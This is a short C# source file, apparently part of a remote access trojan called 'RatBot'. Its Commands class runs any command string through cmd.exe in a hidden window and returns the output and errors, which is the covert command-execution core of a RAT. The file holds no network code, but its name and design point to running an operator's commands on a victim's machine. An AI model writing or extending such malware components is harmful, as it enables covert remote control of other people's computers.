using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RatBot
{
    internal class Commands
    {

        public static string Run(string cmdToRun)
        {
            try
            {
                string retString = "";

                Process processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                //--use /c as a cmd argument to close cmd.exe once its finish processing your commands
                processCmd.StartInfo.Arguments = "/c " + cmdToRun;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.WorkingDirectory = Environment.CurrentDirectory;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.Start();

                retString += processCmd.StandardOutput.ReadToEnd();
                retString += processCmd.StandardError.ReadToEnd();

                return retString;
            }
            catch (Exception ex)
            {
                return ex.Message.ToString() + Environment.NewLine;
            }

        }
    }


}
